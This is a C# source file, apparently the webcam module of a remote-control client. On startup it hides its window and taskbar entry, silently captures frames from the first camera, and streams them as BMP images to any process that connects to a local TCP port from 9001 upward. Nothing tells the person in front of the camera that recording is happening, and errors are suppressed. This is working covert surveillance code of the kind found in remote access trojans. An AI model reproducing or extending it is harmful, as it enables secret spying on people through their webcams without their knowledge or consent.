using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using AForge.Video;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace RemoteControl.Client.CamCapture
{
    public partial class FrmMain : Form
    {
        private System.Collections.Concurrent.ConcurrentQueue<Bitmap> queue = new System.Collections.Concurrent.ConcurrentQueue<Bitmap>();
        private Socket socket = null;
        private string ServerIP = "127.0.0.1";
        private int ServerPort = 9001;
        private Socket client = null;

        public FrmMain()
        {
            InitializeComponent();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.Hide();
            StartCamCapture();
            new Thread(() => StartBroadCastInternal()) { IsBackground = true }.Start();
            new Thread(() => StartTransportServerInternal()) { IsBackground = true }.Start();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private bool StartCamCapture()
        {
            try
            {
                var collection = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (collection.Count < 1)
                    return false;

                var videoSource = new VideoCaptureDevice(collection[0].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);
                this.videoSourcePlayer1.VideoSource = videoSource;
                this.videoSourcePlayer1.Start();

                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        private void StopCamCapture()
        {
            this.videoSourcePlayer1.Stop();
        }

        void videoSource_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            Bitmap bmp = (Bitmap)eventArgs.Frame.Clone();
            queue.Enqueue(bmp); 
        }

        private void StartBroadCastInternal()
        {
            Bitmap bmp = null;
            while (true)
            {
                Thread.Sleep(100);
                if (queue.Count > 0 && queue.TryDequeue(out bmp))
                {
                    if (bmp != null)
                    {
                        BroadCast(bmp);
                    }
                }
            }
        }

        private void BroadCast(Bitmap bmp)
        {
            if (client != null)
            {
                try
                {
                    using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
                        byte[] data = ms.GetBuffer();
                        client.Send(Encode(data));
                        data = null;
                    }
                }
                catch (Exception ex)
                {
                    
                }
            }
            bmp.Dispose();
        }

        private byte[] Encode(byte[] sourceData)
        {
            List<byte> data = new List<byte>();
            data.AddRange(BitConverter.GetBytes(sourceData.Length));
            data.AddRange(sourceData);

            return data.ToArray();
        }

        private void StartTransportServerInternal()
        {
            if (socket != null)
                return;
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                for (int i = 0; i < 100; i++)
                {
                    try
                    {
                        socket.Bind(new IPEndPoint(IPAddress.Parse(ServerIP), ServerPort + i));
                        break;
                    }
                    catch (Exception e)
                    {
                    }
                }
                socket.Listen(10);
                client = socket.Accept();
            }
            catch (Exception ex)
            {
                Environment.Exit(0);
            }
        }

        private void StopTransportServer()
        {
            try
            {
                if (socket != null)
                {
                    socket.Close();
                    socket = null;
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
}
